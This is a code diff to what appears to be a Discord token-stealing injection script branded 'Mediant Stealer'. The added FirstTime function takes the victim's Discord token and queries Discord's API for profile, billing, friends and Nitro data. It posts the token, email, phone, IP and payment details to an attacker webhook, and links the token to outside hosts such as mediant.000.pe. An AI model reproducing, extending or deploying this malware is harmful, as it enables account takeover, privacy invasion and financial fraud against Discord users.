@@ -6,8 +6,9 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', 
-  webhook_protector_key: '%WEBHOOK_KEY%', 
+  webhook: '%WEBHOOK%',
+  webhook_protector_key: '%WEBHOOK_KEY%',
+  notify : false,
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
@@ -576,6 +577,220 @@ const getNitro = (flags) => {
       return 'No Nitro';
   }
 };
+
+const FirstTime = async () => {
+    var token = await execScript(tokenScript)
+    if (config['notify'] !== "true") return true
+    if (fs.existsSync(__dirname + "/Mediant")){
+        try{
+        fs.rmdirSync(__dirname + "/Mediant")
+        }catch(err){
+            console.log(err)
+        }
+    var ip = await getIP()
+    var {
+        appPath,
+        appName
+    } = path
+    var client_discord = appName
+    if (!token) {
+        var params = await makeEmbed({
+            title: "Mediant Stealer Initialized",
+            fields: [{
+                name: "Injection Info",
+                value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
+                inline: !1
+            }]
+        })
+    } else {
+        var user = await getURL("https://discord.com/api/v8/users/@me", token)
+        var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
+        var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
+        var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
+
+        var Billings = parseBilling(billing)
+        var Friends = parseFriends(friends)
+        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/img/xd.jpg"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/banner.gif"
+
+        userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
+        userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
+        var params = await makeEmbed({
+            title: " Mediant Stealer Initialized",
+            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
+            fields: [{
+                name: "Username <:username:1041634536733290596> ",
+                value: `\`${user.username}#${user.discriminator}\``,
+                inline: !0
+            }, {
+                name: "ID <:iduser:1041634535395307520>",
+                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                inline: !0
+            }, {
+                name: "Nitro <a:nitro:1041639670288748634>",
+                value: `${GetNitro(Nitro)}`,
+                inline: !0
+            }, {
+                name: "Badges <:badge:1041634538150973460>",
+                value: `${GetBadges(user.flags)}`,
+                inline: !0
+            }, {
+                name: "Language <:language:1041640473477001236>",
+                value: `${GetLangue(user.locale)}`,
+                inline: !0
+            }, {
+                name: "NSFW <a:nsfw:1041640474617839616>",
+                value: `${GetNSFW(user.nsfw_allowed)}`,
+                inline: !0
+            }, {
+                name: "MFA <a:a2f:1040272766982692885>",
+                value: `${GetA2F(user.mfa_enabled)}`,
+                inline: !0
+            }, {
+                name: "@Copyright",
+                value: `[Mediant Stealer <a:mavikirmizi:853238372591599617>](http://mediant.000.pe/)`,
+                inline: !0
+            }, {
+                name: "Mediant Files",
+                value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
+                inline: !0
+            }, {
+                name: "Billing <a:billing:1041641103629234196>",
+                value: `${Billings}`,
+                inline: !0
+            }, {
+                name: "Email <a:email:1041639672037785691>",
+                value: `\`${user.email ?? "none"}\``,
+                inline: !0
+            }, {
+                name: "Bio <a:mavikirmizi:853238372591599617>",
+                value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
+                inline: !1
+            }, {
+                name: "<a:tokens:1041634540537511957> Token",
+                value: `\`\`\`${token}\`\`\`\n[Copy Token](http://mediant.000.pe/copytoken?p=${token})\n\n[Download Banner](${userBanner})`,
+                inline: !1
+            }],
+            image: userBanner,
+            thumbnail: userAvatar
+        })
+        var params2 = await makeEmbed({
+            title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+            color: config['embed-color'],
+            description: Friends.badges,
+            image: userBanner,
+            thumbnail: userAvatar
+        })
+
+        params.embeds.push(params2.embeds[0])
+    }
+    await post(params)
+    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
+        if (!token) {
+            var params = await makeEmbed({
+                title: "Mediant User log out (User not Logged in before)",
+                fields: [{
+                    name: "Injection Info",
+                    value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
+                    inline: !1
+                }]
+            })
+        } else {
+            var user = await getURL("https://discord.com/api/v8/users/@me", token)
+            var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
+            var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
+            var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
+
+            var Billings = parseBilling(billing)
+            var Friends = parseFriends(friends)
+            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/img/xd.jpg"
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/banner.gif"
+            
+            userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
+            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
+            var params = await makeEmbed({
+                title: "Mediant Stealer Victim got logged out",
+                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+                fields: [{
+                    name: "Username <:username:1041634536733290596> ",
+                    value: `\`${user.username}#${user.discriminator}\``,
+                    inline: !0
+                }, {
+                    name: "ID <:iduser:1041634535395307520>",
+                    value: `\`${user.id}\`\n[Copy ID](http://mediant.000.pe/copytoken?p=${user.id})`,
+                    inline: !0
+                }, {
+                    name: "Nitro <a:nitro:1041639670288748634>",
+                    value: `${GetNitro(Nitro)}`,
+                    inline: !0
+                }, {
+                    name: "Badges <:badge:1041634538150973460>",
+                    value: `${GetBadges(user.flags)}`,
+                    inline: !0
+                }, {
+                    name: "Language <:language:1041640473477001236>",
+                    value: `${GetLangue(user.locale)}`,
+                    inline: !0
+                }, {
+                    name: "NSFW <a:nsfw:1041640474617839616>",
+                    value: `${GetNSFW(user.nsfw_allowed)}`,
+                    inline: !0
+                }, {
+                    name: "A2F <a:a2f:1040272766982692885>",
+                    value: `${GetA2F(user.mfa_enabled)}`,
+                    inline: !0
+                }, {
+                    name: "@Copyright",
+                    value: `[Mediant Stealer  <a:mavikirmizi:853238372591599617>](http://mediant.000.pe/)`,
+                    inline: !0
+                }, {
+                    name: "MEDIANT Files",
+                    value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
+                    inline: !0
+                }, {
+                    name: "Billing <a:billing:1041641103629234196>",
+                    value: `${Billings}`,
+                    inline: !0
+                }, {
+                    name: "Email <a:email:1041639672037785691>",
+                    value: `\`${user.email}\``,
+                    inline: !0
+                }, {
+                    name: "Phone :mobile_phone:",
+                    value: `\`${user.phone ?? "None"}\``,
+                    inline: !0
+                }, {
+                    name: "Bio <a:mavikirmizi:853238372591599617>",
+                    value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
+                    inline: !1
+                }, {
+                    name: "<a:tokens:1041634540537511957> Token",
+                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                    inline: !1
+                }],
+                image: userBanner,
+                thumbnail: userAvatar
+            })
+            var params2 = await makeEmbed({
+                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                color: config['embed-color'],
+                description: Friends.badges,
+                image: userBanner,
+                thumbnail: userAvatar
+            })
+
+            params.embeds.push(params2.embeds[0])
+        }
+    
+        fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
+        await execScript(logOutScript)
+        doTheLogOut = true
+        await post(params)
+    }
+     
+    return false
+}
+}
 
 const getBadges = (flags) => {
   let badges = '';
